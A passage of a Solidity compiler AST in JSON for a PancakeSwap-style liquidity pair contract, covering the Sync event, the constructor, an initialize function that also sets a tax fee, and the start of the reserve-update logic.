													"id": 606,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2388:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2248:164:1"
									},
									"src": "2238:175:1"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 615,
									"name": "Sync",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 614,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 611,
												"indexed": false,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 615,
												"src": "2429:16:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 610,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2429:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 613,
												"indexed": false,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 615,
												"src": "2447:16:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 612,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2447:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2428:36:1"
									},
									"src": "2418:47:1"
								},
								{
									"body": {
										"id": 623,
										"nodeType": "Block",
										"src": "2492:37:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 621,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 618,
														"name": "factory",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 473,
														"src": "2502:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 619,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2443,
															"src": "2512:3:1",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 620,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "2512:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "2502:20:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 622,
												"nodeType": "ExpressionStatement",
												"src": "2502:20:1"
											}
										]
									},
									"documentation": null,
									"id": 624,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 616,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2482:2:1"
									},
									"returnParameters": {
										"id": 617,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2492:0:1"
									},
									"scope": 1700,
									"src": "2471:58:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 653,
										"nodeType": "Block",
										"src": "2698:167:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 637,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 634,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2443,
																	"src": "2716:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 635,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "2716:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 636,
																"name": "factory",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 473,
																"src": "2730:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "2716:21:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20464f5242494444454e",
															"id": 638,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2739:20:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_f0c1e1712466d3d36724e0a82edec721666e68b8fe9433d191f13e7c47aec611",
																"typeString": "literal_string \"Pancake: FORBIDDEN\""
															},
															"value": "Pancake: FORBIDDEN"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_f0c1e1712466d3d36724e0a82edec721666e68b8fe9433d191f13e7c47aec611",
																"typeString": "literal_string \"Pancake: FORBIDDEN\""
															}
														],
														"id": 633,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "2708:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 639,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2708:52:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 640,
												"nodeType": "ExpressionStatement",
												"src": "2708:52:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 643,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 641,
														"name": "token0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 475,
														"src": "2790:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 642,
														"name": "_token0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 626,
														"src": "2799:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "2790:16:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 644,
												"nodeType": "ExpressionStatement",
												"src": "2790:16:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 647,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 645,
														"name": "token1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 477,
														"src": "2816:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 646,
														"name": "_token1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 628,
														"src": "2825:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "2816:16:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 648,
												"nodeType": "ExpressionStatement",
												"src": "2816:16:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 651,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 649,
														"name": "taxfee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 479,
														"src": "2842:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 650,
														"name": "_taxfee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 630,
														"src": "2851:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2842:16:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 652,
												"nodeType": "ExpressionStatement",
												"src": "2842:16:1"
											}
										]
									},
									"documentation": null,
									"id": 654,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 631,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 626,
												"name": "_token0",
												"nodeType": "VariableDeclaration",
												"scope": 654,
												"src": "2620:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 625,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2620:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 628,
												"name": "_token1",
												"nodeType": "VariableDeclaration",
												"scope": 654,
												"src": "2645:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 627,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2645:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 630,
												"name": "_taxfee",
												"nodeType": "VariableDeclaration",
												"scope": 654,
												"src": "2670:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 629,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2670:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2610:78:1"
									},
									"returnParameters": {
										"id": 632,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2698:0:1"
									},
									"scope": 1700,
									"src": "2591:274:1",
									"stateMutability": "nonpayable",
									"superFunction": 2234,
									"visibility": "external"
								},
								{
									"body": {
										"id": 761,
										"nodeType": "Block",
										"src": "3078:852:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 678,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 671,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 666,
																	"name": "balance0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 656,
																	"src": "3109:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 669,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "UnaryOperation",
																			"operator": "-",
																			"prefix": true,
																			"src": "3129:2:1",
																			"subExpression": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 668,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3130:1:1",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		],
																		"id": 667,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3121:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint112_$",
																			"typeString": "type(uint112)"
																		},
																		"typeName": "uint112"
																	},
																	"id": 670,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3121:11:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "3109:23:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 677,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 672,
																	"name": "balance1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 658,
																	"src": "3136:8:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 675,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "UnaryOperation",
																			"operator": "-",
																			"prefix": true,
																			"src": "3156:2:1",
																			"subExpression": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 674,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3157:1:1",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		],
																		"id": 673,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3148:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint112_$",
																			"typeString": "type(uint112)"
																		},
																		"typeName": "uint112"
																	},
																	"id": 676,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3148:11:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "3136:23:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "3109:50:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a204f564552464c4f57",
															"id": 679,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3173:19:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_ecd319b2d162405bd72b657f3fdaddf991823264b7f8c130bf28f20adeb81259",
																"typeString": "literal_string \"Pancake: OVERFLOW\""
															},
															"value": "Pancake: OVERFLOW"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_ecd319b2d162405bd72b657f3fdaddf991823264b7f8c130bf28f20adeb81259",
																"typeString": "literal_string \"Pancake: OVERFLOW\""
															}
														],
														"id": 665,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "3088:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 680,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3088:114:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 681,
												"nodeType": "ExpressionStatement",
												"src": "3088:114:1"
											},
											{
												"assignments": [
													683
												],
												"declarations": [
													{
														"constant": false,
														"id": 683,
														"name": "blockTimestamp",
														"nodeType": "VariableDeclaration",
														"scope": 761,
														"src": "3212:21:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														},
														"typeName": {
															"id": 682,
															"name": "uint32",
															"nodeType": "ElementaryTypeName",
															"src": "3212:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 692,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 690,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 685,
																	"name": "block",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2433,
																	"src": "3243:5:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_block",
																		"typeString": "block"
																	}
																},
																"id": 686,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "timestamp",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3243:15:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_rational_4294967296_by_1",
																	"typeString": "int_const 4294967296"
																},
																"id": 689,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"hexValue": "32",
																	"id": 687,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3261:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_2_by_1",
																		"typeString": "int_const 2"
																	},
																	"value": "2"
																},
																"nodeType": "BinaryOperation",
																"operator": "**",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 688,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3266:2:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "3261:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_4294967296_by_1",
																	"typeString": "int_const 4294967296"
																}
															},
															"src": "3243:25:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 684,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "3236:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint32_$",
															"typeString": "type(uint32)"
														},
														"typeName": "uint32"
													},
													"id": 691,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3236:33:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3212:57:1"
											},
											{
												"assignments": [
													694
												],
												"declarations": [
													{
														"constant": false,
														"id": 694,
														"name": "timeElapsed",
														"nodeType": "VariableDeclaration",
														"scope": 761,
														"src": "3279:18:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														},
														"typeName": {
															"id": 693,
															"name": "uint32",
															"nodeType": "ElementaryTypeName",
															"src": "3279:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 698,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													},
													"id": 697,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 695,
														"name": "blockTimestamp",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 683,
														"src": "3300:14:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 696,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 485,
														"src": "3317:18:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "3300:35:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3279:56:1"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 709,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 705,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															},
															"id": 701,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 699,
																"name": "timeElapsed",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 694,
																"src": "3372:11:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint32",
																	"typeString": "uint32"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 700,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3386:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3372:15:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															"id": 704,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 702,
																"name": "_reserve0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 660,
																"src": "3391:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 703,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3404:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3391:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "3372:33:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"id": 708,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 706,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 662,
															"src": "3409:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 707,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3422:1:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "3409:14:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "3372:51:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 739,
												"nodeType": "IfStatement",
												"src": "3368:396:1",
												"trueBody": {
													"id": 738,
													"nodeType": "Block",
													"src": "3425:339:1",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 722,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 710,
																	"name": "price0CumulativeLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 487,
																	"src": "3499:20:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 721,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 717,
																						"name": "_reserve0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 660,
																						"src": "3578:9:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 714,
																								"name": "_reserve1",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 662,
																								"src": "3561:9:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"expression": {
